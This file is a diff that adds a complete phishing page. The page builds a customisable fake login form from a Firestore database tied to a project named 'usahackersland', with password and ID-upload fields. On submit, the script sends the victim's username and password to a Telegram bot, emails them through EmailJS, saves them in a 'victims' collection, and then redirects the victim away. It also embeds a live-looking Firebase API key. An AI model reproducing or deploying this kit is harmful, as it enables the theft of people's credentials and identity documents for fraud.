@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Generated Form</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 20px; }
+    .form-container {
+      max-width: 800px;
+      margin: auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    img, video { max-width: 100%; border-radius: 8px; margin-bottom: 10px; }
+    input, textarea, button {
+      width: 100%; margin: 10px 0; padding: 10px;
+      border-radius: 5px; border: 1px solid #ccc;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container" id="formView">Loading form...</div>
+
+  <script>
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+      authDomain: "usahackersland.firebaseapp.com",
+      projectId: "usahackersland",
+      storageBucket: "usahackersland.appspot.com",
+      messagingSenderId: "588407428267",
+      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Init EmailJS
+    emailjs.init("YOUR_PUBLIC_KEY");
+
+    const params = new URLSearchParams(location.search);
+    const formId = params.get("id");
+
+    const $ = id => document.getElementById(id);
+
+    // Error if no form ID
+    if (!formId) {
+      $('formView').innerHTML = `<p style="color:red;">⚠️ No form ID provided in the link.</p>`;
+      throw new Error("Missing form ID in URL");
+    }
+
+    // Fetch form data
+    db.collection("forms").doc(formId).get().then(doc => {
+      if (!doc.exists) {
+        $('formView').innerHTML = `<p style="color:red;">❌ Form not found. It may have been deleted.</p>`;
+        return;
+      }
+
+      const data = doc.data();
+      let html = `<div style="color:${data.textColor};background:${data.bgColor};padding:20px;border-radius:10px;background-image:url('${data.bgImageURL}');background-size:${data.bgWidth} ${data.bgHeight};">`;
+
+      if (data.title) html += `<h2 style="text-align:center;color:${data.titleColor}">${data.title}</h2>`;
+      if (data.avatarURL) html += `<div style="text-align:center;"><img src="${data.avatarURL}" style="width:120px;border-radius:50%;border:2px solid #ccc;"></div>`;
+      if (data.bannerURL) html += `<img src="${data.bannerURL}" style="width:100%;">`;
+      if (data.logoURL) html += `<div style="text-align:center;"><img src="${data.logoURL}" style="width:100px;"></div>`;
+      if (data.description) html += `<p style="text-align:center;">${data.description}</p>`;
+      if (data.warning) html += `<p style="color:${data.warningColor};text-align:center;font-weight:bold;">${data.warning}</p>`;
+
+      html += `<form>`;
+      if (data.addAuth) {
+        html += `<input placeholder="${data.usernamePlaceholder || 'Username'}" type="text" required>
+                 <input type="password" placeholder="${data.passwordPlaceholder || 'Password'}" required>`;
+      }
+
+      if (data.frontDesc) html += `<label>${data.frontDesc}</label><input type="file">`;
+      if (data.backDesc) html += `<label>${data.backDesc}</label><input type="file">`;
+      if (data.extraDesc) html += `<p style="color:${data.extraDescColor}">${data.extraDesc}</p>`;
+
+      const fields = [...(data.fields || []), ...(data.extraFields || [])];
+      fields.forEach(f => {
+        if (f.trim()) html += `<input placeholder="${f.trim()}">`;
+      });
+
+      let emoji = {
+        arrow: "➡️", check: "✅", lock: "🔒",
+        user: "👤", credit: "💳", none: ""
+      }[data.btnIcon] || "";
+
+      html += `<button style="background:${data.btnColor};">${emoji} ${data.buttonText}</button>`;
+      if (data.footerText) html += `<p style="text-align:center;">${data.footerText}</p>`;
+      if (data.redirectDesc && data.useRedirect) html += `<p style="text-align:center;color:gray;">${data.redirectDesc}</p>`;
+      html += `</form>`;
+
+      if ((data.imageGallery || []).length || (data.videoGallery || []).length) {
+        html += `<div style="margin-top:15px;">`;
+        data.imageGallery.forEach(url => html += `<img src="${url}">`);
+        data.videoGallery.forEach(url => html += `<video controls src="${url}"></video>`);
+        html += `</div>`;
+      }
+
+      html += `</div>`;
+      $('formView').innerHTML = html;
+
+      // Store redirect link globally
+      window.formRedirectURL = data.redirectLink || "https://example.com";
+    }).then(() => {
+      // Attach submit listener after form is loaded
+      const observer = new MutationObserver(() => {
+        const form = document.querySelector("#formView form");
+        if (form) {
+          observer.disconnect();
+
+          form.addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            const inputs = form.querySelectorAll("input[type='text'], input[type='password']");
+            let username = inputs[0]?.value || "";
+            let password = inputs[1]?.value || "";
+            const redirectURL = window.formRedirectURL;
+
+            const telegramBotToken = "YOUR_BOT_TOKEN";
+            const telegramChatId = "YOUR_CHAT_ID";
+
+            let telegramSent = false;
+            let emailSent = false;
+
+            // Send to Telegram
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: `🔥 New credentials:\nUsername: ${username}\nPassword: ${password}\nRedirect: ${redirectURL}`
+              })
+            }).then(res => {
+              if (res.ok) telegramSent = true;
+            });
+
+            // Send to Email via EmailJS
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+              username: username,
+              password: password,
+              redirect: redirectURL
+            }).then(() => {
+              emailSent = true;
+            }).catch(() => {
+              emailSent = false;
+            });
+
+            // Save to Firestore victims collection
+            firebase.firestore()
+              .collection("forms").doc(formId)
+              .collection("victims").add({
+                Username: username,
+                Password: password,
+                redirectLinkSentTo: redirectURL,
+                telegramSent: telegramSent,
+                emailSent: emailSent,
+                timestamp: new Date().toLocaleString()
+              });
+
+            // Play notification sound
+            const audio = new Audio("https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg");
+            audio.play();
+
+            // Redirect instantly
+            window.location.href = redirectURL;
+          });
+        }
+      });
+
+      observer.observe(document.getElementById("formView"), { childList: true, subtree: true });
+    }).catch(err => {
+      $('formView').innerHTML = `<p style="color:red;">⚠️ Error loading form: ${err.message}</p>`;
+    });
+  </script>
+</body>
+</html>
